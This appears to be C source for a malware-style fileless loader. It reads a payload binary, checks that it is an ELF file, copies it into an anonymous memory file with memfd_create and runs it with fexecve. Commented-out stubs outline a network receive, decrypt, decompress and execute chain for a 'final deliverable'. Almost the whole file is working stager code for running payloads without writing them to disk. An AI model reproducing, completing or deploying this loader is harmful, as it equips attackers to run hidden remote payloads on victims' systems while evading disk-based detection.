#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include "detect.h"

//#include <decompress.h>
//#include <decrypt.h>
//#include <execute.h>
//#include <networking.h>

/*
    Get size in bytes of given file
*/
int fsize(FILE *fp){
    int prev=ftell(fp);
    fseek(fp, 0L, SEEK_END);
    int sz=ftell(fp);
    fseek(fp,prev,SEEK_SET); //go back to where we were
    return sz;
}

int main(int argc, char **argv){
    void *payload;
    void *decrypted;
    void *decompressed;
    FILE *payload_file; // to hold payload file pointer, remove in final deliverable
    int size; // to hold file size, remove in final deliverable
    int payload_fd; // in memory file descriptor
    int write_return_size;
    int d; //to hold the return value of detect()
    const char * payload_argv[] = {"../test_files/test_ELF", "testing", NULL}; // argv for payload
    const char * payload_envp[] = {NULL}; // envp for payload
     
/*
    while(receive(payload) != 0){
        puts("BAD SHIT YO");
        sleep(1);
    }

    decrypt(payload, decrypted);
    decompress(decrypted, decompressed);
    execute(decrypted);
*/
    
    payload_file = fopen("../test_files/test_ELF", "r"); // open payload binary
    size = fsize(payload_file); // get size in bytes
    payload = calloc(size, sizeof(unsigned char)); // allocate on heap
    fread(payload, sizeof(unsigned char), size, payload_file); // read file to heap
    fclose(payload_file); //close file

    d = detect((unsigned char *)payload); //determine if the payload is an executable/ELF

    while ((payload_fd = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
        printf("memfd_create() failed. File descriptor created: %d\n", payload_fd);
        close(payload_fd);
        return -1;
    }

    write_return_size = write(payload_fd, payload, size);  // write to mem_fd and error check
    if (write_return_size != size){
        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", write_return_size, size);
        return -1;
    }
    
    if (fexecve(payload_fd, (char * const *) payload_argv, (char * const *) payload_envp) == -1){ // execute payload
        puts("fexecve() failed");
    }

    return 0;
}